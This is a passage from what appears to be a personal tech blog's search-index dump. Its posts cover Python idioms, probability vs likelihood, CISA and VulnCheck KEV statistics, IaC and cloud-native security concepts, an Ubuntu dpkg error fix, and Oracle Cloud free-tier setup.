asynchronously, we can to build a list of coroutines and with create_task() and gather().\nConclusion # AsyncIO is suitable for handling those network connections issue, where waiting is required. We always call them IO-bound task. This is because network connections (or IO-bound task) spend most time on waiting and very little on CPU computation.\n","date":"2024-05-14 06:35","externalUrl":null,"permalink":"/posts/asyncio/codes/","section":"posts","summary":"Let\u0026rsquo;s learn AsyncIO by code.","title":"Understanding AsyncIO by Code","type":"posts"},{"content":"","date":"2024-05-11 05:50","externalUrl":null,"permalink":"/tags/cybersecurity/","section":"tags","summary":"","title":"cybersecurity","type":"tags"},{"content":" Managing Cybersecurity with AI: It\u0026rsquo;s all about augmentation, not replacement. It is very important for a leader to make it clear that AI is meant to augment not replace the human expertise.\n","date":"2024-05-11 05:50","externalUrl":null,"permalink":"/posts/managing_cybersecurity_with_ai/","section":"posts","summary":"How do we go about leading a security team alongside Generative AI?","title":"Managing Cybersecurity With AI","type":"posts"},{"content":"","date":"2024-05-11 05:50","externalUrl":null,"permalink":"/tags/qotd/","section":"tags","summary":"","title":"qotd","type":"tags"},{"content":" Probability is about the chances or likelihood of something happening in the future.\nAnd Likelihood is about how well the data we have matches a specific outcome or hypothesis.\nProbability # Probability is the long-run frequency of how often something occurs. It exists in one universe, meaning that probabilities are related to each other and must add up to one.\nFor example, if you flip a fair coin, there\u0026rsquo;s a 50% probability of getting heads and a 50% probability of getting tails.\nIt\u0026rsquo;s often used when we know all the possible outcomes of an event and want to figure out how likely each outcome is.\nLikelihood # Likelihood is used in statistics when we don\u0026rsquo;t know the probability of something happening.\nFor example, if you have symptoms like coughing and fever, there\u0026rsquo;s a high likelihood that you have a cold, based on what we know about the common symptoms of a cold.\nIt\u0026rsquo;s commonly used in statistics to measure how probable it is that a certain set of data would occur if a particular hypothesis were true.\nCompare/Contrast # Likelihoods are probabilities of the observed data under different scenarios. They do not add up to one and cannot be interpreted as probabilities.\nIf you have a fair coin, the probability of zero heads is 1/4, the probability of one head is 1/2, and the probability of two heads is 1/4. These probabilities add up to one.\nBut if you have an unfair coin, the probabilities will be different. If you flip the situation around and only observe two heads, the likelihood of two heads will depend on which type of coin you flipped.\nConclusion # In conclusion, probability is used when we know the universe we are in, and likelihood is used when we don\u0026rsquo;t know the probability of something happening. They are two different ways of looking at the same thing.\n","date":"2024-05-02 16:15","externalUrl":null,"permalink":"/posts/probability_vs_likelihood/","section":"posts","summary":"Likelihood is a kind of probability, and probability is a kind of likelihood, but they\u0026rsquo;re used in different ways.","title":"Probability Vs Likelihood","type":"posts"},{"content":"","date":"2024-05-02 16:15","externalUrl":null,"permalink":"/tags/statistic/","section":"tags","summary":"","title":"statistic","type":"tags"},{"content":" CISA KEV has been released 30 months. Today, there are total of 1103 (+20) CVE been added to CISA KEV catalog.\nCISA Catalog of Known Exploited Vulnerabilities [ 2024.04.30/1103 ]\nUpdates # As of today, there are total of 1099 CVE have overdue, and another 4 will due in May 2024.\nHighlights (within CISA KEV catalog):\nThe top-5 vendors with highest number of vulnerabilities remain the same (total 174 vendors). The top-5 vendors hold 551 (around 50%) of all the 1103 CVE. The top-5 vulnerable products remain the same (total 453 products). There are 253 (or ~27%) CVE found at the top-5 vulnerable products. The mean value increases to 91.91 (was 90.25). The top-5 months where distribution of KEV is higher than mean remain the same (Mar, Apr, May Jun, Nov). Current State # Microsoft Apple Cisco Adobe Google others 284 75 71 67 54 552 Windows Multiple Products (Apple) Internet Explorer Flash Player Chromium V8 others 112 38 31 29 28 865 mean_val=91.91666666666667\nJan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec 28 32 132 164 240 146 58 46 47 45 125 40 ","date":"2024-05-01 20:28","externalUrl":null,"permalink":"/posts/cisa_kev_30m/","section":"posts","summary":"Analysis updates of CISA KEV catalog.","title":"30-Month Update with CISA KEV","type":"posts"},{"content":"","date":"2024-04-23 17:51","externalUrl":null,"permalink":"/tags/oneliner/","section":"tags","summary":"","title":"oneliner","type":"tags"},{"content":" Use ternary operation as another oneliner. Simple Ternary Operation # Many may not know that Python does support ternary operation. Let\u0026rsquo;s see the function below.\ndef func(x): if x \u0026gt;= 0: return x else: return -x We can simplify the function above with ternary operation, as below:\ndef func(x): return ( x if x \u0026gt;= 0 else -x ) Ternary Operator # The ternary operator in Python is simply a shorter way of writing an if and if…else statement.\nHere\u0026rsquo;s the syntax:\nSyntax: [on_true] if [expression] else [on_false]\nTernary Usages # Below are the examples to use Ternary Operator in Python if-else.\n# Similar to abs() x = 1 y = x if x \u0026gt;= 0 else -x # Print whichever is smaller a, b = 10, 20 min = a if a \u0026lt; b else b print(min) # Advanced nested ternary operator a, b = 10, 20 print (\u0026#34;Both a and b are equal\u0026#34; if a == b else \u0026#34;a is greater than b\u0026#34; if a \u0026gt; b else \u0026#34;b is greater than a\u0026#34;) # output: b is greater than a Ternary with Tuples # Explanation: In this example, we use a tuple for selecting an item. And if [x \u0026gt;= 0] is True, it will return 1. Otherwise it will return 0 as False. Basically, the condition [x\u0026gt;=0] has become the index for the tuple.\n# Similar to abs() x = 1 y = (-x, x)[x \u0026gt;= 0] # y is 1 # Print whichever is smaller a, b = 10, 20 print((b, a)[a \u0026lt; b]) # output: 10 Some argue that this isn\u0026rsquo;t a proper ternary operator. See extra notes on why this method is less efficient and not recommended.\nTernary with Dictionary # Similar to ternary with tuple().\n# Get the smaller value a, b = 10, 20 print({True: a, False: b} [a \u0026lt; b]) # output: 10 Ternary with Lambda # Similar to ternary with tuple().\n# Get the smaller value a, b = 10, 20 print((lambda: b, lambda: a)[a \u0026lt; b]()) # output: 10 Ternary with Print-if # # Get the greater value a=5 b=7 # [statement_on_True] if [condition] else [statement_on_false] print(a,\u0026#34;is greater\u0026#34;) if (a\u0026gt;b) else print(b,\u0026#34;is Greater\u0026#34;) # output: 7 is Greater Extra Notes # OK. The extra notes here is about the argument on the usage of ternary with tuple() method.\nLet\u0026rsquo;s dive into the situation below where we need to get the average (mean) value from a list of numbers.\nAt first, we have a function getAverage() as below.\ndef getAverage(nlist): return sum(nlist) / len(nlist) But, what if there is an empty list been passed to the function? So, here is the enhanced version.\ndef getAverage(nlist): return sum(nlist) / len(nlist) if nlist else 0 Now, let\u0026rsquo;s try to apply ternary operator with tuple() like how we did above.\ndef getAverage(nlist): return (0, sum(nlist)/len(nlist))[len(nlist) \u0026gt;= 0] Now, problem starts to arise. Because Python will create the tuple() without evaluate the condition (in this case [len(nlist)\u0026gt;=0]) first. This will cause ZeroDivisionError when an empty list is passed to the function.\nFrom the efficiency perspective, this method is less efficient than if-else method. This method has to first create the tuple, including the sum(nlist)/len(nlist), then follow by evaluating the condition or subscribe. And this method relies on the conversion from True/False to index for a tuple().\n","date":"2024-04-23 17:51","externalUrl":null,"permalink":"/posts/python_ternary_operation/","section":"posts","summary":"Ternary operations in Python.","title":"Python Ternary Operation","type":"posts"},{"content":"","date":"2024-04-18 17:47","externalUrl":null,"permalink":"/tags/cloud/","section":"tags","summary":"","title":"cloud","type":"tags"},{"content":"","date":"2024-04-18 17:47","externalUrl":null,"permalink":"/tags/iac/","section":"tags","summary":"","title":"iac","type":"tags"},{"content":" In today\u0026rsquo;s IT landscape, Infrastructure-as-Code (IaC) offers a multitude of benefits. While it demonstrably enhances efficiency and control, it\u0026rsquo;s crucial to acknowledge inherent risks and implement best practices to ensure both ease of use and security. IaC # Infrastructure-as-Code or IaC allows to treat the infrastructure like code. This means we can define our infrastructure in a plain text file, and use tools to automate the provisioning and management of that infra.\nThis will save time and money, and it can help to ensure the infrastructure consistency and is always configured according to policy.\nTypically, we can use Terraform (by HashiCorp) or OpenTofu (open source) to write code that defines the infrastructure.\nThis code can then be tracked, versioned and used to provision and manage the entire infrastructure.\nBenefits # The power of IaC share the same ease and efficiency we have in software development. It replaces manual configuration with automated scripting, transforming infrastructure into code that can be easily versioned, tracked and deployed. This brings a wave of benefits to any organization.\nWith IaC, speed and agility become second nature. Gone are the days of waiting for manual provisioning.\nIaC automates the entire process, allowing us to spin up new environments or scale existing ones in a matter of minutes. This newfound agility empowers you to adapt to changing needs quickly and experiment with new ideas without delay.\nIaC also streamlines disaster recovery, enabling the restore of critical infrastructure in a fraction of the time compared to traditional methods. As a result, downtime becomes a distant memory, and every organization can stay focused on delivering value.\nRisks \u0026amp; Challenges # While IaC offers undeniable advantages, it\u0026rsquo;s crucial to acknowledge the potential security risks.\nOne key concern is the creation of a broad attack surface. By codifying infrastructure, IaC can inadvertently expose vulnerabilities within the code itself. And malicious actors could exploit these flaws to gain access to critical systems.\nAdditionally, IaC often requires storing sensitive data like API keys and credentials within the code. If not secured properly, this data becomes a prime target for attackers, potentially leading to breaches and compromised systems.\nFurthermore, IaC workflows can introduce the risk of excessive privilege creep. To function effectively, IaC tools may necessitate elevated access levels. If not carefully controlled, these privileges can be misused or accidentally leaked, creating security gaps.\nCompliance can also be a challenge.\nRegulations often mandate specific security controls on infrastructure. IaC needs to be implemented with these requirements in mind to avoid compliance hurdles.\nFinally, IaC can introduce friction into development processes. New security protocols and code reviews may be required, potentially slowing down deployments.\nHowever, by acknowledging these risks and implementing proper mitigation strategies, organizations can leverage the power of IaC while maintaining a secure and compliant environment.\nBest Practices # Security is paramount.\nInfrastructure as Code (IaC) can offer a powerful and efficient way to manage infrastructure. Here are a few key best practices to build a secure foundation by leveraging its efficiency and unique features:\nMaintain a Detailed Inventory (Asset Management)\nKeeping track of IaC resources is crucial, just like how we did for physical asset.\nDesign and document a standard to label all the resources and the ownership properly. This includes implementing a system for identifying, tagging, monitoring, and maintaining an inventory list.\nThis becomes especially important as development teams grow, preventing lost resources and simplifying vulnerability scanning.\nScan Your Templates\nTemplates are the building blocks of IaC automation.\nRegularly scan these templates using dedicated tools to identify and address potential vulnerabilities before they become security gaps.\nTrivy (AquaSec): Scans SBOM, CVE, IaC misconfiguration, sensitive info and secrets. TFSec (AquaSec): Static analysis of terraform code to spot potential misconfiguration. CheckOV (PrismaCloud): Scans and analyze IaC code for misconfiguration including Terraform, CloudFormation, K8s, Helm, ARM templates and Serverless framework. TerraScan (Tenable): Static code analyzer for IaC (500+) for misconfiguration, configuration change (drift) monitoring, security vulnerabilities and compliance violation. Can run locally or integrated with CI/CD. Address Environmental Drift\nOver time, infrastructure configurations can drift due to unmonitored changes made by developers.\nRegularly benchmark assets\u0026rsquo; configurations to identify and rectify any environmental drift that may introduce security risks. This ensures the infrastructure remains compliant and secure.\nSecure Your Secrets\nAvoid storing sensitive information or secrets, such as passwords, API keys, and tokens, directly in IaC templates or databases.\nInstead, leverage a professional secrets management engine, like vault or CSP secrets mgmt, to securely store and manage these critical assets. This eliminates the risk of accidental exposure.\nEnforce Least Privilege and Secure Workflows\nWhile it\u0026rsquo;s tempting to give developers broad access, it\u0026rsquo;s essential to implement the principle of least privilege.\nUse authentication and identity-based rules to ensure developers only have the necessary rights for their tasks. Additionally, establish a workflow and approval process for all IaC changes, adding another layer of security.\nBy following these best practices, you can leverage the power of IaC while maintaining a secure and compliant infrastructure environment.\nLinks # Infrastructure-as-Code (IaC) The Myth of Cloud Agnosticism The Rise of Terraform in Cloud Security ","date":"2024-04-18 17:47","externalUrl":null,"permalink":"/posts/iac_security/","section":"posts","summary":"Risks, challenges and the best practices for IaC security.","title":"IaC: Security Risk and Best Practices","type":"posts"},{"content":" In general, list comprehension is faster while generator is more memory efficient. List Comprehension # List Comprehension allows us to create a list using for loop with a single line. This makes it an elegant way of defining and creating a list.\nSee Comprehension in Python for more examples.\nGenerator Expression # Generator Expression is similar to list comprehension, with the only difference is, it never construct the list object.\nInstead of creating a list (and keeping it in the memory), the generator simply generates the next element in demand.\nIn normal situation, a function terminates whenever it gets a return statement. But, a function with a yield statement is called, it saves the state of the function and can be picked up from the same state, next time the function is called.\nAnd the Generator Expression allows us to create a generator without the yield keyword.\nA typical use of generator expression is, to use generator as iterators. For example, we can use generator comprehension to count the total lines a big CSV file.\n# Read a big CSV file count = 0 filename = \u0026#39;big_file.csv\u0026#39; csv_gen = (row for row in open(filename)) for row in csv_gen: count += 1 print(f\u0026#39; Row count is : {count}\u0026#39;) The Difference # For generator expression, parenthesis are used in place of square brackets.\n# List comprehension list_comp = [x*2 for x in range(256)] # Generator expression gene_expr = (x*2 for x in range(256)) Iterating over the generator expression or the list comprehension will do the same thing.\nHowever, the list comprehension will create the entire list in memory first while the generator expression will create the items on the fly. And we use generator expression for very large (and also infinite!) sequences.\nIn contrast, it is faster to create a generator expression, but it is faster to iterate a list comprehension because Python reserves memory for the whole list.\nUsage # Use list comprehension when:\nwe need to iterate multiple times. we need to use list built-in methods, like len() or sum(), or index or slice. Use generator expression when:\nwe need to iterate only once. we need to iterate it in order. we need our code to be more memory efficiency. (See in PEP289) Advanced Generator Methods # In addition to yield, generator objects can make use of the following methods:\nUse .send() to send data to generator. Use .throw() to raise generator exception. Use .close() to stop a generator\u0026rsquo;s iteration. Below is an example of generator using yield.\ndef is_palindrome(n): # Check if the number is a palindrome return str(n) == str(n)[::-1] def next_palindrome(start): # Start generating palindrome numbers from the next number num = start + 1 while True: if is_palindrome(num): yield num num += 1 # Accept input from the user n = int(input(\u0026#34;Input a number: \u0026#34;)) # Create the palindrome generator palindrome_gen = next_palindrome(n) # Find and print the next palindrome number next_palindrome_num = next(palindrome_gen) print(\u0026#34;Next palindrome number after\u0026#34;, n, \u0026#34;is:\u0026#34;, next_palindrome_num) Below is an example of generator to list all the palindrome numbers (between 2 inputs).\ndef is_palindrome(n): return str(n) == str(n)[::-1] # Take 2 inputs: Start and End n = int(input(\u0026#34;Input a START number: \u0026#34;)) m = int(input(\u0026#34;Input an END number: \u0026#34;)) # Create the range generator range_gen = (x for x in range(n, m+1)) for r in range_gen: if is_palindrome(r): print(f\u0026#39;Palindrome: {r}\u0026#39;) Links # Comprehension in Python Introduction to Python generator ","date":"2024-04-16 12:01","externalUrl":null,"permalink":"/posts/generator_expression/","section":"posts","summary":"Python: List comprehension vs Generator expression.","title":"Generator Expression in Python","type":"posts"},{"content":"","date":"2024-04-09 06:03","externalUrl":null,"permalink":"/tags/aws/","section":"tags","summary":"","title":"aws","type":"tags"},{"content":" Explore the basic technologies in public cloud platform: Amazon Web Services (AWS), Microsoft Azure, and Google Cloud Platform (GCP). Compute # At on-prem, or traditional data center, Compute is referring to the physical server. At cloud, Compute is referring to virtual machine or container or serverless. typically, virtual machine isn\u0026rsquo;t the go-to technology to use nowadays. serverless solution is easier to be used (called endpoint). Compute Technologies AWS Azure GCP Serverless Lambda Azure Functions Google Cloud Functions Virtual Machine EC2 Virtual Machine Compute Engine Hosted Container Fargate Container Instances Cloud Run Container Orchestration EKS AKS Kubernetes Engine Storage # For storing data as object. Can apply labels and filters to the object. typically used for long-term storage, like PDF and word files (unstructure data). Object Storage AWS Azure GCP Storage S3 Blob Storage Cloud Storage Database # For structure data which allows for querying and complex transaction. Optimized for frequent access. More specialized DB such as knowledge graphs, vector DB. Database AWS Azure GCP Relational DB MySQL/PostgreSQL MySQL/PostgreSQL MySQL/PostgreSQL NoSQL DynamoDB CosmosDB Firestore/datastore Data warehouse RedShift Synapse Analytics BigQuery AL/ML # Solutions for vision-focused, generative AI, etc. Still new. AI/ML AWS Azure GCP Pre-built AI Amazon Rekognition, Amazon Translate, Amazon Comprehend Azure Cognitive, Azure Machine Learning Google Cloud Vision AI, Google Cloud Translation, Google Cloud Natural Language ML SageMaker Azure Machine Learning Vertext AI AutoML Tools SageMaker Autopilot, Amazon Kendra Azure Automated ML AutoML Vision, AutoML Natural Language ","date":"2024-04-09 06:03","externalUrl":null,"permalink":"/posts/basic_cloud_technologies/","section":"posts","summary":"Understanding the basic technologies in cloud computing is the key to manage modern infrastructure.","title":"Basic Technologies in Cloud Computing","type":"posts"},{"content":"","date":"2024-04-09 06:03","externalUrl":null,"permalink":"/tags/gcp/","section":"tags","summary":"","title":"gcp","type":"tags"},{"content":" Python comprehension == one_liner. Basic L1 # values = [] for x in range(1,11): values.append(x) The block of code above can be simplified as:\nvalues = [ x for x in range(1,11) ]\nevens = [] for n in range(1,11): is_even = n % 2 == 0 if is_even: evens.append(number) The block of code above can be simplified as:\nevens = [ n for n in range(1,11) if n % 2 == 0 ]\nLevel 2 # names = [ \u0026#39;jane\u0026#39;, \u0026#39;jenny\u0026#39;, \u0026#39;jim\u0026#39;, \u0026#39;jimmy\u0026#39;, \u0026#39;jimny\u0026#39;, \u0026#39;jone\u0026#39;, \u0026#39;june\u0026#39; ] valid = [] for name in names: if len(name) \u0026lt;= 1: continue if name[0] != \u0026#39;j\u0026#39;: continue if name[-1] != \u0026#39;j\u0026#39;: continue valid.append(name) The block of code above can be simplified as:\nvalid = [ name for name in names if len(name) \u0026gt;= 2 if name[0] =='j' if name[-1] == 'y' ]\nmatrix = [[\u0026#39;a\u0026#39;,\u0026#39;b\u0026#39;,\u0026#39;c\u0026#39;],[\u0026#39;d\u0026#39;,\u0026#39;e\u0026#39;,\u0026#39;f\u0026#39;],[\u0026#39;g\u0026#39;,\u0026#39;h\u0026#39;,\u0026#39;i\u0026#39;]] flat = [] for y in matrix: for x in y: flat.append(x) The block of code above can be simplified as:\nflat = [ x for y in matrix for x in y ]\ntypes = [] for n in range(2,12): if n % 2 ==0: types.append(\u0026#39;E\u0026#39;) else: types.append(\u0026#39;O\u0026#39;) The block of code above can be simplified as:\ntypes = [ \u0026quot;E\u0026quot; if n % 2 == 0 else \u0026quot;O\u0026quot; for n in range(2,12) ]\n3D-Matrix # \u0026gt;\u0026gt;\u0026gt; mm = [] \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; for a in range(5): ... m1 = [] ... for b in range(4): ... m2 = [] ... for c in range(3): ... m2.append(c) ... m1.append(m2) ... mm.append(m1) ... \u0026gt;\u0026gt;\u0026gt; mm [ [[0, 1, 2], [0, 1, 2], [0, 1, 2], [0, 1, 2]], [[0, 1, 2], [0, 1, 2], [0, 1, 2], [0, 1, 2]], [[0, 1, 2], [0, 1, 2], [0, 1, 2], [0, 1, 2]], [[0, 1, 2], [0, 1, 2], [0, 1, 2], [0, 1, 2]], [[0, 1, 2], [0, 1, 2], [0, 1, 2], [0, 1, 2]] ] The block of code above can be simplified as:\nmmm = [[[x for x in range(3)] for _ in range(4)] for _ in range(5) ]\nFunction # def square(x): return x**2 square_num = [] for x in range(1,11): square_num.append(square(x)) The block of code above can be simplified as:\nsquare_num = [ square(x) for x in range(1,11) ]\nDictionary # pairs = [ (\u0026#39;a\u0026#39;, 1), (\u0026#39;b\u0026#39;, 2), (\u0026#39;c\u0026#39;, 3) ] my_dict = { k:v*2 for k,v in pairs } Set # Python set() uses the same {} as dict() as long as there is no key.\nBelow here is a typical example where many will use it to remove duplicate values in a list().\nnums = [1,1,2,2,2,3,4,4,5,6,6] uniqsqs = { x**2 for x in nums } Generator # sum_of_sqs = sum(x**2 for x in range(1_000_000)) The above code block will generate a sum of all the squares from the number 0 to 1 millioni, and just give me the end result (without storing all the different values).\nThis means it is different than sum([x**2 for x in range(1_000_000)]). This will generate a list of 1 million values before sum them up.\nUsing a generator, it is more efficient in term of memory.\nSummary # Thanks to Tim with the excellent tutorial on 10 Python Comprehensions.\nI\u0026rsquo;ve modified some codes to suit my own study. Below are the quick summary.\n# Basic L1 values = [ x for x in range(1,11) ] evens = [ n for n in range(1,11) if n % 2 == 0 ] # Level L2 names = [ \u0026#39;jane\u0026#39;, \u0026#39;jenny\u0026#39;, \u0026#39;jim\u0026#39;, \u0026#39;jimmy\u0026#39;, \u0026#39;jimny\u0026#39;, \u0026#39;jone\u0026#39;, \u0026#39;june\u0026#39; ] valid = [ name for name in names if len(name) \u0026gt;= 2 if name[0] ==\u0026#39;j\u0026#39; if name[-1] == \u0026#39;y\u0026#39; ] matrix = [[\u0026#39;a\u0026#39;,\u0026#39;b\u0026#39;,\u0026#39;c\u0026#39;],[\u0026#39;d\u0026#39;,\u0026#39;e\u0026#39;,\u0026#39;f\u0026#39;],[\u0026#39;g\u0026#39;,\u0026#39;h\u0026#39;,\u0026#39;i\u0026#39;]] flat = [ x for y in matrix for x in y ] types = [ \u0026#34;E\u0026#34; if n % 2 == 0 else \u0026#34;O\u0026#34; for n in range(2,12) ] # 3D-Matrix mmm = [[[x for x in range(3)] for _ in range(4)] for _ in range(5) ] # Function square_num = [ square(x) for x in range(1,11) ] # Dictionary pairs = [ (\u0026#39;a\u0026#39;, 1), (\u0026#39;b\u0026#39;, 2), (\u0026#39;c\u0026#39;, 3) ] my_dict = { k:v*2 for k,v in pairs } # Set nums = [1,1,2,2,2,3,4,4,5,6,6] uniqsqs = { x**2 for x in nums } # Generator sum_of_sqs = sum(x**2 for x in range(1_000_000)) Links # MySeq: Comprehension in Python ","date":"2024-04-01 19:37","externalUrl":null,"permalink":"/posts/more_python_comprehensions/","section":"posts","summary":"More Python comprehension examples.","title":"More Python Comprehensions","type":"posts"},{"content":"","date":"2024-03-24 20:16","externalUrl":null,"permalink":"/tags/error/","section":"tags","summary":"","title":"error","type":"tags"},{"content":" An essential troubleshooting guide for Sysadm. Recently, I come across update error code 1 while updating my Ubuntu. And this isn\u0026rsquo;t the first time it happens.\nIt can be in different formats, such as:\nsubprocess installed post-installation script returned error exit status 10 E: Sub-process /usr/bin/dpkg returned an error code (1) dpkg: error processing package dpkg (--configure): installed dpkg package post-installation script subprocess returned error exit status 1 Errors were encountered while processing: dpkg Quick Resolution # Remove post info files of those troubleshome package. $ sudo mv /var/lib/dpkg/info/dpkg.* /tmp Note that package name can be others, such as openssh-server.* or dpkg.*.\nUse force install. $ sudo apt install -f Reconfigure package database. $ sudo dpkg --configure -a Root Cause # Most likely, the package got corrupted while installing a package. Usually reconfiguring fix the problem. And if a package installation was interrupted previously, then force installing is needed to resolve it.\n","date":"2024-03-24 20:16","externalUrl":null,"permalink":"/posts/ubuntu_update_dpkg_error_code_1/","section":"posts","summary":"Resolving various errors while updating my Ubuntu.","title":"Update Error: dpkg error code 1","type":"posts"},{"content":" The CNAPP is advantageous in a number of ways, with the key benefit of increasing Security Visibility to the cloud. CNAPP # A Cloud-Native Application Protection Platform (CNAPP) provides a holistic view of cloud security risks in one platform.\nAs noted, a CNAPP integrates multiple cloud security capabilities, including CWPP, CSPM and CIEM, even with Kubernetes Security Posture Management (KSPM), with compliance and cybersecurity risk management.\nBesides, CNAPP could incorporate shift-left capabilities to identify risks in development lifecycle.\nWith an agentless CNAPP deployed, the platform can address the cloud security gaps that traditional agent-based tools cannot.\nBenefits of CNAPP include centralized management, enhanced visibility, improved security posture, and deeper insights into cloud environments.\nLet\u0026rsquo;s explore the 3-key common components of cloud native tools under CNAPP platform.\nKey Components # Cloud Workload Protection Platform - CWPP Protects workloads by detecting threats, managing vulnerabilities, and addressing security risks. Cloud Security Posture Management - CSPM Monitors cloud environments, manages configurations, and proactively applies controls for security and compliance. Cloud Identity Entitlement Management - CIEM Manages identities, access rights, and permissions to mitigate excessive privileges and data breaches. Kubernetes Security Posture Management - KSPM Manages continuous monitoring (misconfiguration), assessing (image/host vulnerability, access control and identity management), and ensuring the security and compliance of Kubernetes environments. CSPM \u0026amp; CWPP # Here\u0026rsquo;s the summary of CSPM and CWPP.\nCSPM CWPP Focus Security posture \u0026amp; compliance of cloud infra Protection of cloud workloads \u0026amp; applications Scope Monitor configuration, identity \u0026amp; access, storage. Protect VM, container, serverless workloads, code Approach Preventive \u0026amp; proactive Reactive \u0026amp; protective Capability CSPM CWPP Monitor for misconfiguration \u0026amp; vulnerabilities Yes No Identifies compliance gaps Yes No Provide risk assessment \u0026amp; visualization Yes No Integration into cloud provider API for visibility Yes No Measureing the cloud infra and platform services Yes No Protect against malware \u0026amp; intrusions No Yes Enable workload behavior analysis \u0026amp; anomaly detection No Yes Runtime app security protection No Yes Workload hardening and configuration No Yes Vulnerability Management No Yes Utilize agents for intra-workload No Yes Limitations # Disadvantages of CSPM \u0026amp; CWPP:\nCSPM can only identify simple control plane misconfiguration. Some CSPM could have limited insights to workload posture. Others # Cloud Access Security Brokers - CASB Brokers each session between users and cloud service to enforce policy for enterprise, such as authentication, SSO, authorization, credential mapping, device profiling, encryption, logging, alerting, malware detection/prevention. Security Visibility # When come to the cloud, the key is Security Visibility.\nHere\u0026rsquo;s the evolution of security visibility: starting from agents, then scanners, and CSPM.\nAgents Scanners CSPM Scope Host Network Cloud Focus Full visibility to OS, Apps \u0026amp; Data Scan apps \u0026amp; network Examine cloud metadata Looking for Rogue activity Improper response Deviations and misconfiguration Typical Tests # CSPM Tests\nStorage bucket permissions Network configuration IAM hygiene, root usage, password policy, etc User \u0026amp; API logging settings and permissions CWPP Tests (Agent-based)\nSoftware vulnerabilities Malware detection/prevention OS \u0026amp; software patch status Misplaced keys or sensitive data What Next? # CNAPP = CIEM + KSPM + CSPM + CWPP\nLinks # Kubernetes Security Posture Management (KSPM) Explain Kubernetes Security Best Practices ","date":"2024-03-22 06:04","externalUrl":null,"permalink":"/posts/cloud_native_tools/","section":"posts","summary":"What are CSPM, CWPP, and CIEM?","title":"Cloud Native Tools","type":"posts"},{"content":"","date":"2024-03-18 14:00","externalUrl":null,"permalink":"/tags/free/","section":"tags","summary":"","title":"free","type":"tags"},{"content":"","date":"2024-03-18 14:00","externalUrl":null,"permalink":"/tags/oracle/","section":"tags","summary":"","title":"oracle","type":"tags"},{"content":" Just sign up into Oracle Cloud and get my FREE Linux server within 20 min. Today, I just come across this video from Gary. And by following the instruction (and tips) from the video, I manage to have my Linux server up and running within 20 min.\nOracle Cloud # Oracle Cloud Free Tier is an Always Free services. This means we can use it with no time constraints (subject only to the capacity limits).\nThe free Linux server comes with full root access and public IP address.\nInstruction # Follow the instruction from Gary\u0026rsquo;s YouTube video, and get your free Linux server now.\nThanks Gary for the tips on choosing the OS image.\nMy First Instance # In case you are interest, I have choose Canonical-Ubuntu-22.04-Minimal image for my first Linux server instance.\nBelow are the RAM and HD sizes.\nI also setup the SSH access by upload my own public key. And I just document it in $HOME/.ssh/config for easier access.\nHost opf HostName 15x.17x.24x.14x User ubuntu Finally, I can simply ssh opf and login without password.\nFinal Thought # I strongly suggest to enable Secure Verification while signing up at Oracle Cloud. Because to sign up in free tier, I still have to leave my credit card info at Oracle Cloud (even it will never be charged).\nLastly is about my plan on using the free Linux server.\nAt this time, I\u0026rsquo;m planning to:\nRun dockers for vulnerability scanning. Run dockers for OSINT research. Develop scripts in Python. Links # Oracle Cloud Free Tier ","date":"2024-03-18 14:00","externalUrl":null,"permalink":"/posts/oracle_cloud_free_tier/","section":"posts","summary":"Build, test and deploy application on a Linux server in Oracle Cloud - for FREE.","title":"Oracle Cloud Free Tier","type":"posts"},{"content":"","date":"2024-03-17 14:59","externalUrl":null,"permalink":"/tags/threatmgmt/","section":"tags","summary":"","title":"threatmgmt","type":"tags"},{"content":"","date":"2024-03-17 14:59","externalUrl":null,"permalink":"/tags/vulncheck/","section":"tags","summary":"","title":"vulncheck","type":"tags"},{"content":" VulnCheck’s KEV catalog equips vulnerability management teams and cybersecurity professionals with faster, broader coverage in an efficient machine-readable dataset needed for detection, prioritization, and remediation. Staying ahead of cyber threats requires constant vigilance, especially when it comes to exploited vulnerabilities.\nVulnCheck KEV steps up as a next-generation solution, empowering security teams to proactively manage vulnerabilities and prioritize remediation efforts.\nVulnCheck KEV # This robust platform offers the largest real-time collection of known exploited vulnerabilities (KEVs).\nBy incorporating data beyond what CISA KEV provides, VulnCheck KEV equips you with a more comprehensive threat landscape.\nFeature CISA KEV VulnCheck KEV Scope Curated list of confirmed KEVs Broader scope including CISA KEV and additional reported KEVs (~80% more) Timelines Updates may lag behind real-time threats Aims for earlier warnings, potentially identifying threats 27 days before CISA Additional Info Basic vulnerability information Enriched data with eploit references and context for better decision-making Clear Advantages # With its focus on real-time threat intelligence and actionable data, VulnCheck KEV empowers security teams to:\nPrioritize vulnerabilities based on a more complete picture of the threat landscape. Respond faster to emerging threats with earlier warnings. Minimize exposure by focusing resources on vulnerabilities with readily available exploit information. With VulnCheck KEV, it allows us to embrace proactive Vulnerability Management\nVulnCheck KEV goes beyond basic vulnerability management. It\u0026rsquo;s a powerful tool designed to help Cybersecurity professional stay ahead of attackers and safeguard our system.\nVendor Intro/Update # Feb 29, 2024:\nMar 08, 2024:\nTool: vcheck-cli # vcheck-cli is a small tool written by me over the weekend.\nIt can:\nDownload the VulnCheck KEV as zip file. Extract the JSON into a Python list. Search CVE within VulnCheck KEV. Show info such as ransomeware campaign, exploit database, exploit count, and CISA KEV status. Below is the screenshot:\nvcheck-cli : ./main.py -ve CVE-2021-27102 cve-2019-12985 2024-1709 As of today, the JSON file from VulnCheck KEV contains 2044 CVEs (compare CISA\u0026rsquo;s 1089).\nLinks # VulnCheck KEV Catalog VulnCheck\u0026rsquo;s API Documentation API/Schema vcheck-cli at GitHub ","date":"2024-03-17 14:59","externalUrl":null,"permalink":"/posts/vulncheck_kev_community/","section":"posts","summary":"Introducing the VulnCheck Known Exploited Vulnerabilities (KEV) catalog, a free community database of known exploited vulnerabilities fused with exploit intelligence.","title":"VulnCheck KEV Community","type":"posts"},{"content":" Always prefer with over try-finally. An essential practices on cleaning up your code using Context Manager in Python.\nUsing a context manager, with, and let the object handle its own cleanup, is an essential coding practices in Python.\nWhy Context Manager? # There are 4 common use cases where we need to manage the cleanup of codes to free up system resources. The worst case of not doing so will lead to memory leaks, slowing down the entire system or even crash.\nOpen a file for writing. Open a socket for connection. Open a temporary files. Open a lock. To make things more complex, an exception could be raised during the 4 use cases above. Using a Context Manager can make Python to ensure all the cleanup will happen automagically.\ndef main(): with open(\u0026#39;test1.txt\u0026#39;) as fp1, open(\u0026#39;test2.txt\u0026#39;, \u0026#39;w\u0026#39;) as fp2: fp2.write(fp1.read()) YouTube Tutorial # In this video, mCoding has demonstrated on using with as context manager. He also 